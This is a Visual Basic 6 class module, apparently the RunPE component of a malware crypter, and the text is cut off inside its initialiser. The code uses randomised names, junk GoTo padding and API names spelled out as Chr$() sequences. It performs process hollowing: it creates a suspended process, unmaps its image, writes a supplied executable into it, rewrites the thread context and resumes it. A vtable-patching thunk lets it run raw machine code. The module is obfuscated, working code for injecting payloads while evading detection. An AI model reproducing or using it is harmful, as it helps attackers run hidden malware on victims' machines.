VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "fiayN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Declare Function iAjGqAGCO Lib "USER32" (ByVal hDC As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal OutputWidth As Long, ByVal OutputHeight As Long, ByVal iStepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Private Declare Function BDMkfIKrxQZ Lib "WINMM.DLL" Alias "mciGetErrorStringA" (ByVal ErrorNumber As Long, ByVal ReturnBuffer As String, ByVal ReturnBufferSize As Long) As Long 'BOOL
Private Declare Function ppotelsIjiy Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function jHlPNvkEvl Lib "WINMM.DLL" Alias "mixerGetLineControlsA" (ByVal hMixerObj As Long, pMixerLc As Long, ByVal fdwControls As Long) As Long
Private Declare Function ssfgGPcEYCbtFtqk Lib "olepro32.dll" (ByRef PicDesc As Any, ByRef RefIID As Long, ByVal fPictureOwnsHandle As Long, ByRef IPic As Long) As Long
Private Declare Function QGQQSfvwRTdAi Lib "USER32" Alias "LoadIconA" (ByVal hLib As Long, ByVal lngIconID As Long) As Long
Private Declare Function HzSbQ Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function sqvgahKmQn Lib "USER32" (ByVal hCursor As Long) As Long
Private Declare Function lKnRCymHxoC Lib "WINMM.DLL" (ByVal hMixerObj As Long, pMixerCD As Long, ByVal fdwDetails As Long) As Long
Private Declare Function viUvRftasei Lib "USER32" (ByVal hDC As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal OutputWidth As Long, ByVal OutputHeight As Long, ByVal iStepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Private Declare Function tnFCZvTaVhk Lib "USER32" (ByVal hIcon As Long) As Long
Private Declare Function VgpkNdwQjeTzHIGLxqx Lib "USER32" (ByVal IconOrCursor As Long, ByRef pICONINFO As Long) As Long
Private Declare Function oDHKBbqjS Lib "USER32" (ByVal hCursor As Long) As Long
Private Declare Function YAESdyLylLihJr Lib "USER32" Alias "LoadBitmapA" (ByVal hInstance As Long, ByVal lngBitmapID As Long) As Long
Private Declare Function yYyJDVSpLkc Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Private Declare Function BPlZiFAe Lib "WINMM.DLL" (ByVal uPeriod As Long) As Long
Private Declare Function hmukPZZYczGNsEETY Lib "WINMM.DLL" Alias "mciSendStringA" (ByVal CommandString As String, ByVal ReturnBuffer As String, ByVal ReturnBufferSize As Long, ByVal hCallback As Long) As Long 'MCIERROR
Private Declare Function eslVDFaCHURANn Lib "USER32" (ByVal hDC As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal OutputWidth As Long, ByVal OutputHeight As Long, ByVal iStepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Private Declare Function QkLgKjAbBMGZHfOZf Lib "WINMM.DLL" (ByVal hMixer As Long) As Long
Private Declare Function DSaclIDhj Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function pxmRNNMQCIPhHGQMPHg Lib "USER32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function mTIdSJYiQ Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function EfoAcwbzRdROIb Lib "USER32" Alias "RegisterWindowMessageA" (ByVal LPString As String) As Long
Private Declare Function fpvrDTUqsBZ Lib "WINMM.DLL" (ByVal uPeriod As Long) As Long
Private Declare Sub bmpEabl Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Declare Function zgmFNCie Lib "version.dll" Alias "VerQueryValueA" (pBlock As Any, ByVal lpSubBlock As String, lplpBuffer As Any, puLen As Long) As Long
Private Declare Function iSLSx Lib "olepro32.dll" (ByVal OLE_COLOR As Long, ByVal hPalette As Long, lpColorRef As Long) As Long
Private Declare Function adgYwaEokZtkboyh Lib "WINMM.DLL" (ByVal uPeriod As Long) As Long
Private Declare Function mNkwKsJvzaNLF Lib "USER32" (ByVal hDC As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal OutputWidth As Long, ByVal OutputHeight As Long, ByVal iStepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Private Declare Function rMmrozCRnoxHCgvOiBw Lib "WINMM.DLL" (ByVal uPeriod As Long) As Long
Private Declare Function abZeOHOtGFVacTtIAl Lib "USER32" Alias "SetWindowTextA" (ByVal hWnd As Long, ByVal LPString As String) As Long
Private Declare Function pRQlvPdQCeAzbIaMQqQ Lib "USER32.DLL" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByRef lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Declare Function olHeCuqCSiDrAYSwyfy Lib "USER32" (ByVal hCursor As Long) As Long
Private Declare Function BhqrpuRZgJQVmqsk Lib "WINMM.DLL" Alias "sndPlaySoundA" (ByVal Sound As Long, ByVal lngFlags As Long) As Long
Private Declare Function QBjlGjnBxguSTuDPsLrO Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function hsmEnKuEKGEVkst Lib "WINMM.DLL" Alias "mmioInstallIOProcA" (ByVal fccIOProc As Long, ByVal pIOProc As Long, ByVal dwFlags As Long) As Long
Private Declare Function VzAho Lib "USER32" Alias "LoadStringA" (ByVal hLib As Long, ByVal ResourceID As Long, ByVal lpBuffer As String, ByVal nBufferSize As Long) As Long
Private Declare Function EkfgejTbiyaZpfiZy Lib "USER32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal hIcon As Long) As Long
Private Declare Function DmavlcqAjjVVxFS Lib "USER32" (ByVal hCursor As Long) As Long
Private Declare Function tRjvjhbtqMwHNJUmn Lib "gdi32" (ByVal hMetaFile As Long) As Long
Private Declare Function TrYBRxEYfUAvwuzl Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Private Declare Function PqcrvypO Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function GCrLBsGQzzmZzVjxfwim Lib "gdi32" (ByVal hColorSpace As Long) As Long
Private Declare Function xrJGezYealpDZ Lib "USER32" (ByVal hCursor As Long) As Long
Private Declare Function uoRiAUoi Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function yzxCngnRf Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Function yAsRhZJrtNq Lib "olepro32.dll" (ByVal OLE_COLOR As Long, ByVal hPalette As Long, lpColorRef As Long) As Long
Private Declare Function ToBpbCZYzhykoOp Lib "gdi32" (ByVal hGDIObj As Long) As Long
Private Declare Function MJgCbSObrGc Lib "olepro32.dll" (ByRef PicDesc As Any, ByRef RefIID As Long, ByVal fPictureOwnsHandle As Long, ByRef IPic As Long) As Long
Option Explicit

Private Const bKJxjKhtHpGswQKICU       As Long = &H5A4D&
Private Const oJjokwzOkluEzdsLfy        As Long = &H4550&

Private Const iNQYVbLELq           As Long = &H40
Private Const CSQZQqFxiPRmOT           As Long = &HF8
Private Const sMaNzbx     As Long = &H28
Private Const YFQIMnNZSli As Long = &H28

Private Const uayPp              As Long = &H10007
Private Const bUnQtdotqBShpqzYSv          As Long = &H4
Private Const ekDLBhcdbgQY                As Long = &H1000
Private Const vQVmce               As Long = &H2000
Private Const vYCAjQsiZnxggSSuCPr    As Long = &H40

Private Type tCaHlAhn
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type OEkffejTMTy
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type KbehZxbFplaulcp
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type iiVHjFRgNf
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As KbehZxbFplaulcp
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type UvjgbsqMiGMIUY
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IJSdYBQ
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type DQQGmvw
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type sdVdHUT
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfyEYgVBwxvAlelPData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As DQQGmvw
End Type

Private Type nqiGVOy
    Signature                   As Long
    FileHeader                  As IJSdYBQ
    OptionalHeader              As sdVdHUT
End Type

Private Type cASfSPJcZw
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type qwsEUV
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type
Private jDglyI         As Long
Private rfQsO      As Long
Private pQoaeEepjByVr         As Boolean
Private IEPhvQEOmhKLsM          As Long
Private aPvEEDIgmtYlkA       As Long
Private tkJZRBjl(&HFF)   As Byte
        
Public Function HitnFo() As Long
GoTo qZbvYdqAVjQIkGF
qZbvYdqAVjQIkGF:
 'This function will be replaced with machine code laterz
GoTo OgRVwQi
OgRVwQi:
 'Do not add any public procedure on top of it
GoTo urNjI
urNjI:
End Function

Public Function koCyhvTUvEQtMsP(ByRef werigwiw() As Byte, Optional wg8ihrd As String) As Boolean
GoTo iuLavjsP
iuLavjsP:
On Error Resume Next
GoTo oqQrwEuajjhmJQYC
oqQrwEuajjhmJQYC:
 Dim i        As Long
GoTo OeildBQJtbeybftpZ
OeildBQJtbeybftpZ:
 Dim dx    As UvjgbsqMiGMIUY
GoTo LLnvHkDj
LLnvHkDj:
 Dim es    As nqiGVOy
GoTo ZyZkewgCmxCzKcq
ZyZkewgCmxCzKcq:
 Dim YlKKlu   As qwsEUV
GoTo zIhbEGntMUKq
zIhbEGntMUKq:
 Dim jCiFYxYjdv   As tCaHlAhn
GoTo mkpahoEf
mkpahoEf:
 Dim Blv As OEkffejTMTy
GoTo vlnfEh
vlnfEh:
 Dim xJbpxyHfa    As iiVHjFRgNf
GoTo JrgArivGpoccDLYA
JrgArivGpoccDLYA:
 Dim sYfyGv     As Long
GoTo zYpBpnhzwSCNSPbstOP
zYpBpnhzwSCNSPbstOP:
 Dim QQ      As Long
GoTo xeHQDJdlbGBCAFqjrUwh
xeHQDJdlbGBCAFqjrUwh:
 Dim aLRZqQPgVZQpRx     As Long
GoTo BDvUxcMIwRHy
BDvUxcMIwRHy:
 
GoTo QFFsfFcpDkBosRFD
QFFsfFcpDkBosRFD:
 If Not pQoaeEepjByVr Then Exit Function
GoTo PMjFekgruJfg
PMjFekgruJfg:

GoTo zuYnGbtodJ
zuYnGbtodJ:
 Call bmpEabl(dx, werigwiw(0), iNQYVbLELq)
GoTo SQVGAHlyxNRULlAtdK
SQVGAHlyxNRULlAtdK:
 
GoTo iKOdnHVIvVsrTBSEI
iKOdnHVIvVsrTBSEI:
 If Not dx.e_magic = bKJxjKhtHpGswQKICU Then
GoTo ITNgdzV
ITNgdzV:
  Exit Function
GoTo miuLavjsPKo
miuLavjsPKo:
 End If
GoTo QrwEuajjhm
QrwEuajjhm:

GoTo QYCOOeildBQJtbey
QYCOOeildBQJtbey:
 Call bmpEabl(es, werigwiw(dx.e_lfanew), CSQZQqFxiPRmOT)
GoTo ftpZm
ftpZm:
 
GoTo LnvHkDjGZyZkewgC
LnvHkDjGZyZkewgC:
 If Not es.Signature = oJjokwzOkluEzdsLfy Then
GoTo xCzKcqyz
xCzKcqyz:
  Exit Function
GoTo hbEGntMUKqlmkpa
hbEGntMUKqlmkpa:
 End If
GoTo oEffvln
oEffvln:
 
GoTo EhLJrg
EhLJrg:
 sYfyGv = oJKTsZC("kernel32")
GoTo rivGpoccDLYAT
rivGpoccDLYAT:
 QQ = oJKTsZC(Chr$(110) & Chr$(116) & Chr$(100) & Chr$(108) & Chr$(108))
GoTo YpBpnhzwSCNS
YpBpnhzwSCNS:
 
GoTo bstOPZxeHQDJdlbGB
bstOPZxeHQDJdlbGB:
 If wg8ihrd = vbNullString Then
GoTo AFqjrUwhxBDvU
AFqjrUwhxBDvU:
  wg8ihrd = Space(260)
GoTo cMIwRHyMQFFs
cMIwRHyMQFFs:
  aLRZqQPgVZQpRx = cswyqPsQ(sYfyGv, Chr$(71) & Chr$(101) & Chr$(116) & Chr$(77) & Chr$(111) & Chr$(100) & Chr$(117) & Chr$(108) & Chr$(101) & Chr$(70) & Chr$(105) & Chr$(108) & Chr$(101) & Chr$(78) & Chr$(97) & Chr$(109) & Chr$(101) & Chr$(87))
GoTo FcpDkB
FcpDkB:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, App.hInstance, StrPtr(wg8ihrd), 260
GoTo sRFDxPMjF
sRFDxPMjF:
 End If
GoTo kgruJf
kgruJf:
 
GoTo qzuYnGb
qzuYnGb:
 With es.OptionalHeader
GoTo odJRSQVGAHl
odJRSQVGAHl:
  
GoTo xNRULlAtdKMi
xNRULlAtdKMi:
  jCiFYxYjdv.cb = Len(jCiFYxYjdv)
GoTo OdnHVIvVsrTBSEIi
OdnHVIvVsrTBSEIi:
   
GoTo TNgdzVumiuLavjs
TNgdzVumiuLavjs:
  aLRZqQPgVZQpRx = cswyqPsQ(sYfyGv, Chr$(67) & Chr$(114) & Chr$(101) & Chr$(97) & Chr$(116) & Chr$(101) & Chr$(80) & Chr$(114) & Chr$(111) & Chr$(99) & Chr$(101) & Chr$(115) & Chr$(115) & Chr$(87))
GoTo KoqQrwEuajjhmJQYCO
KoqQrwEuajjhmJQYCO:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, 0, StrPtr(wg8ihrd), 0, 0, 0, bUnQtdotqBShpqzYSv, 0, 0, VarPtr(jCiFYxYjdv), VarPtr(Blv)
GoTo eildBQJtbeybftpZm
eildBQJtbeybftpZm:

GoTo LnvHkDjGZyZkewgCxCzKcqyz
LnvHkDjGZyZkewgCxCzKcqyz:
  aLRZqQPgVZQpRx = cswyqPsQ(QQ, Chr$(78) & Chr$(116) & Chr$(85) & Chr$(110) & Chr$(109) & Chr$(97) & Chr$(112) & Chr$(86) & Chr$(105) & Chr$(101) & Chr$(119) & Chr$(79) & Chr$(102) & Chr$(83) & Chr$(101) & Chr$(99) & Chr$(116) & Chr$(105) & Chr$(111) & Chr$(110))
GoTo hbEGntMUKqlmkpaoEffvln
hbEGntMUKqlmkpaoEffvln:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hProcess, .ImageBase
GoTo EhLJrgrivGpoccDLYAT
EhLJrgrivGpoccDLYAT:
  
GoTo YpBpnhzwSCNSbstOPZxeHQDJdlbGB
YpBpnhzwSCNSbstOPZxeHQDJdlbGB:
  aLRZqQPgVZQpRx = cswyqPsQ(sYfyGv, Chr$(86) & Chr$(105) & Chr$(114) & Chr$(116) & Chr$(117) & Chr$(97) & Chr$(108) & Chr$(65) & Chr$(108) & Chr$(108) & Chr$(111) & Chr$(99) & Chr$(69) & Chr$(120))
GoTo AFqjrUwhxBDvUcMIwRHyMQFFs
AFqjrUwhxBDvUcMIwRHyMQFFs:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hProcess, .ImageBase, .SizeOfImage, ekDLBhcdbgQY Or vQVmce, vYCAjQsiZnxggSSuCPr
GoTo FcpDkBsRFDxPMjF
FcpDkBsRFDxPMjF:
  
GoTo kgruJfqzuYnGb
kgruJfqzuYnGb:
  aLRZqQPgVZQpRx = cswyqPsQ(sYfyGv, Chr$(87) & Chr$(114) & Chr$(105) & Chr$(116) & Chr$(101) & Chr$(80) & Chr$(114) & Chr$(111) & Chr$(99) & Chr$(101) & Chr$(115) & Chr$(115) & Chr$(77) & Chr$(101) & Chr$(109) & Chr$(111) & Chr$(114) & Chr$(121))
GoTo TIoxywBmgnQedtxArQgY
TIoxywBmgnQedtxArQgY:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hProcess, .ImageBase, VarPtr(werigwiw(0)), .SizeOfHeaders, 0
GoTo qsNquISnBobBYQz
qsNquISnBobBYQz:
 
GoTo ykoNozt
ykoNozt:
  For i = 0 To es.FileHeader.NumberOfSections - 1
GoTo IfBaRNaqFbOYvqTV
IfBaRNaqFbOYvqTV:
   bmpEabl YlKKlu, werigwiw(dx.e_lfanew + CSQZQqFxiPRmOT + YFQIMnNZSli * i), Len(YlKKlu)
GoTo QckaFNOMRpwDi
QckaFNOMRpwDi:
   PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hProcess, .ImageBase + YlKKlu.VirtualAddress, VarPtr(werigwiw(YlKKlu.PointerToRawData)), YlKKlu.SizeOfRawData, 0
GoTo uJNQHhwpZGJ
uJNQHhwpZGJ:
  Next i
GoTo GKZUER
GKZUER:

GoTo rRbnPjOmEe
rRbnPjOmEe:
  xJbpxyHfa.ContextFlags = uayPp
GoTo PJcLiRdieqHVef
PJcLiRdieqHVef:
  
GoTo MGkmSZsAq
MGkmSZsAq:
  aLRZqQPgVZQpRx = cswyqPsQ(QQ, Chr$(78) & Chr$(116) & Chr$(71) & Chr$(101) & Chr$(116) & Chr$(67) & Chr$(111) & Chr$(110) & Chr$(116) & Chr$(101) & Chr$(120) & Chr$(116) & Chr$(84) & Chr$(104) & Chr$(114) & Chr$(101) & Chr$(97) & Chr$(100))
GoTo QRPUFMTkKKaQSKkMrpQ
QRPUFMTkKKaQSKkMrpQ:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hThread, VarPtr(xJbpxyHfa)
GoTo gQNbmUTHHjrDgzfC
gQNbmUTHHjrDgzfC:
 
GoTo hUSMfcyityvGYZuvEdJ
hUSMfcyityvGYZuvEdJ:
  aLRZqQPgVZQpRx = cswyqPsQ(sYfyGv, Chr$(87) & Chr$(114) & Chr$(105) & Chr$(116) & Chr$(101) & Chr$(80) & Chr$(114) & Chr$(111) & Chr$(99) & Chr$(101) & Chr$(115) & Chr$(115) & Chr$(77) & Chr$(101) & Chr$(109) & Chr$(111) & Chr$(114) & Chr$(121))
GoTo CjpIQGmhi
CjpIQGmhi:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hProcess, xJbpxyHfa.Ebx + 8, VarPtr(.ImageBase), 4, 0
GoTo lVOQAcM
lVOQAcM:
    
GoTo hjbAdH
hjbAdH:
  xJbpxyHfa.Eax = .ImageBase + .AddressOfEntryPoint
GoTo ocwnesClkY
ocwnesClkY:
  
GoTo lHTjPhTYxljdvsOl
lHTjPhTYxljdvsOl:
  aLRZqQPgVZQpRx = cswyqPsQ(QQ, Chr$(78) & Chr$(116) & Chr$(83) & Chr$(101) & Chr$(116) & Chr$(67) & Chr$(111) & Chr$(110) & Chr$(116) & Chr$(101) & Chr$(120) & Chr$(116) & Chr$(84) & Chr$(104) & Chr$(114) & Chr$(101) & Chr$(97) & Chr$(100))
GoTo PLQapKLVfaDSmGZT
PLQapKLVfaDSmGZT:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hThread, VarPtr(xJbpxyHfa)
GoTo oxywBmgnQedtxAr
oxywBmgnQedtxAr:
  
GoTo gYIqsNquISnBobBYQz
gYIqsNquISnBobBYQz:
  aLRZqQPgVZQpRx = cswyqPsQ(QQ, Chr$(78) & Chr$(116) & Chr$(82) & Chr$(101) & Chr$(115) & Chr$(117) & Chr$(109) & Chr$(101) & Chr$(84) & Chr$(104) & Chr$(114) & Chr$(101) & Chr$(97) & Chr$(100))
GoTo ykoNoztIfBaRNaqFbOYvqTV
ykoNoztIfBaRNaqFbOYvqTV:
  PwCVeSyuutxjp aLRZqQPgVZQpRx, Blv.hThread, 0
GoTo QckaFNOMRpwDigwzCuSi
QckaFNOMRpwDigwzCuSi:
 End With
GoTo KtvPs
KtvPs:
 
GoTo KHqDddEMaBVA
KHqDddEMaBVA:
 koCyhvTUvEQtMsP = True
GoTo qQrCwOxTDOUQctIPQbyt
qQrCwOxTDOUQctIPQbyt:
 
GoTo ZELfncHDDBGsyFQxwMCF
ZELfncHDDBGsyFQxwMCF:
End Function

Public Function PwCVeSyuutxjp(ByVal agnRfeuy As Long, ParamArray sRhZJrtN()) As Long
GoTo VzecJySIzNYG
VzecJySIzNYG:

GoTo ttUdqRmQpGSHEyQ
ttUdqRmQpGSHEyQ:
 Dim dRmcShr  As Long
GoTo lUflhtJKgirOvZpVc
lUflhtJKgirOvZpVc:
 Dim i     As Long
GoTo DsYTTSQIBIn
DsYTTSQIBIn:
 Dim aM    As String
GoTo zPSVNmPueaOjZPeoQ
zPSVNmPueaOjZPeoQ:
 Dim owJlFkIambYR  As String
GoTo JwYuGUCTFJjYUOheBQvB
JwYuGUCTFJjYUOheBQvB:
 
GoTo JMbwyHRMpFYs
JMbwyHRMpFYs:
 If agnRfeuy = 0 Then Exit Function
GoTo FvbkkjoZRZDQPgjm
FvbkkjoZRZDQPgjm:
 
GoTo CRKudf
CRKudf:
 For i = UBound(sRhZJrtN) To 0 Step -1
GoTo chuEanbMoKJlS
chuEanbMoKJlS:
  owJlFkIambYR = owJlFkIambYR & Chr$(54) & Chr$(56) & NonDtwoMq(CLng(sRhZJrtN(i)))
GoTo VaAalfxu
VaAalfxu:
 Next
GoTo nLEALdrMAKidGHoINV
nLEALdrMAKidGHoINV:
 
GoTo rAAzEbipThgwzCuS
rAAzEbipThgwzCuS:
 dRmcShr = VarPtr(tkJZRBjl(0))
GoTo bKtvPsx
bKtvPsx:
 dRmcShr = dRmcShr + (UBound(sRhZJrtN) + 2) * 5
GoTo HqDddEMaBVAZqQrC
HqDddEMaBVAZqQrC:
 dRmcShr = agnRfeuy - dRmcShr - 5
GoTo OxTDOUQctIP
OxTDOUQctIP:
 
GoTo bytQZELfncHDDBGsyF
bytQZELfncHDDBGsyF:
 aM = Chr$(56) & Chr$(66) & Chr$(52) & Chr$(67) & Chr$(50) & Chr$(52) & Chr$(48) & Chr$(56) & Chr$(53) & Chr$(49) & Chr$(60) & Chr$(77) & Chr$(71) & Chr$(115) & Chr$(83) & Chr$(83) & Chr$(72) & Chr$(70) & Chr$(50) & Chr$(53) & Chr$(83) & Chr$(62) & Chr$(69) & Chr$(56) & Chr$(60) & Chr$(66) & Chr$(83) & Chr$(75) & Chr$(57) & Chr$(52) & Chr$(83) & Chr$(75) & Chr$(52) & Chr$(50) & Chr$(71) & Chr$(62) & Chr$(53) & Chr$(57) & Chr$(56) & Chr$(57) & Chr$(48) & Chr$(49) & Chr$(54) & Chr$(54) & Chr$(51) & Chr$(49) & Chr$(67) & Chr$(48) & Chr$(67) & Chr$(51)
GoTo xwMCFxVzecJySIzNYGGt
xwMCFxVzecJySIzNYGGt:
 aM = Replace(aM, Chr$(60) & Chr$(77) & Chr$(71) & Chr$(115) & Chr$(83) & Chr$(83) & Chr$(72) & Chr$(70) & Chr$(50) & Chr$(53) & Chr$(83) & Chr$(62), owJlFkIambYR)
GoTo UdqRmQpGSHE
UdqRmQpGSHE:
 aM = Replace(aM, Chr$(60) & Chr$(66) & Chr$(83) & Chr$(75) & Chr$(57) & Chr$(52) & Chr$(83) & Chr$(75) & Chr$(52) & Chr$(50) & Chr$(71) & Chr$(62), NonDtwoMq(dRmcShr))
GoTo QNlUflhtJKgi
QNlUflhtJKgi:
 
GoTo OvZpVcvDsY
OvZpVcvDsY:
 Call SApJzqEOxxkkLU(aM)
GoTo TSQIBInNzPSVNmPueaO
TSQIBInNzPSVNmPueaO:
 
GoTo ZPeoQQJ
ZPeoQQJ:
 PwCVeSyuutxjp = IdHgyJ
GoTo YuGUCTFJjYUO
YuGUCTFJjYUO:
End Function

Private Function NonDtwoMq(ByVal lData As Long) As String
GoTo eBQvBxJ
eBQvBxJ:
 Dim kbAPIs(3)   As Byte
GoTo NjktDycrKexs
NjktDycrKexs:
 Dim i     As Long
GoTo MVQUaKD
MVQUaKD:
 
GoTo pCBRVYPpEwhOQmNS
pCBRVYPpEwhOQmNS:
 bmpEabl kbAPIs(0), lData, &H4
GoTo rLaMzaw
rLaMzaw:
 For i = 0 To 3
GoTo YEVIMmMYRkh
YEVIMmMYRkh:
  NonDtwoMq = NonDtwoMq & Right(Chr$(48) & Hex(kbAPIs(i)), 2)
GoTo ayqmyOeznwTOsu
ayqmyOeznwTOsu:
 Next
GoTo vAIxe
vAIxe:
End Function

Private Sub SApJzqEOxxkkLU(ByVal sThunk As String)
GoTo nlqNUcFSR
nlqNUcFSR:
 Dim i   As Long
GoTo mpgFUNx
mpgFUNx:
 For i = 0 To Len(sThunk) - 1 Step 2
GoTo hCfjxt
hCfjxt:
  tkJZRBjl((i / 2)) = CByte(Chr$(38) & Chr$(72) & Mid$(sThunk, i + 1, 2))
GoTo qPPqz
qPPqz:
 Next
GoTo oHnKdCdoiAkGqAGC
oHnKdCdoiAkGqAGC:
End Sub

Private Function IdHgyJ() As Long
GoTo guCDMkfIKrxQZOupq
guCDMkfIKrxQZOupq:
 bmpEabl IEPhvQEOmhKLsM, ByVal ObjPtr(Me), &H4
GoTo telsIjjyo
telsIjjyo:
 IEPhvQEOmhKLsM = IEPhvQEOmhKLsM + &H1C
GoTo jIlPNvkEvm
jIlPNvkEvm:
 bmpEabl aPvEEDIgmtYlkA, ByVal IEPhvQEOmhKLsM, &H4
GoTo JtsggHPcEYDbt
JtsggHPcEYDbt:
 bmpEabl ByVal IEPhvQEOmhKLsM, VarPtr(tkJZRBjl(0)), &H4
GoTo trlDAQGRQTfwxS
trlDAQGRQTfwxS:
 IdHgyJ = HitnFo
GoTo dBiLbHNhpfKFGEJunuZ
dBiLbHNhpfKFGEJunuZ:
 bmpEabl ByVal IEPhvQEOmhKLsM, aPvEEDIgmtYlkA, &H4
GoTo lBFHzZBgQLAUL
lBFHzZBgQLAUL:
End Function

Public Function vpHEcLVcYk(ByVal sLib As String, ByVal sProc As String) As Long
GoTo PbJIwiJgsGoFr
PbJIwiJgsGoFr:
 vpHEcLVcYk = Me.cswyqPsQ(Me.oJKTsZC(sLib), sProc)
GoTo VJHBTQnJink
VJHBTQnJink:
End Function

Public Function oJKTsZC(ByVal sLib As String) As Long
GoTo yNjktDycrKe
yNjktDycrKe:
 oJKTsZC = PwCVeSyuutxjp(rfQsO, StrPtr(sLib & vbNullChar))
GoTo shMVQUaKDLpC
shMVQUaKDLpC:
End Function

Public Property Get yEYgVBwxvAlelP() As Boolean
    yEYgVBwxvAlelP = pQoaeEepjByVr
End Property

Public Sub Class_Initialize()
GoTo RVYPpEwhOQmNS
